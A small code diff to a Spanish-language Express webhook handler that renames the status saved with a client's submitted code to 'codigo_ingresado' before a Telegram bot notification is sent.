@@ -154,10 +154,10 @@ app.post('/webhook', async (req, res) => {
       return res.sendStatus(200);
     }
 
-    const cliente = cargarCliente(txid) || { status: 'esperando' };
-    cliente.codigo = codigoStr;
-    cliente.status = 'codigo_guardado';
-    guardarCliente(txid, cliente);
+   const cliente = cargarCliente(txid) || { status: 'esperando' };
+cliente.codigo = codigoStr;
+cliente.status = 'codigo_ingresado';  // ← NUEVO STATUS ESPECIAL
+guardarCliente(txid, cliente);
 
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: 'POST',
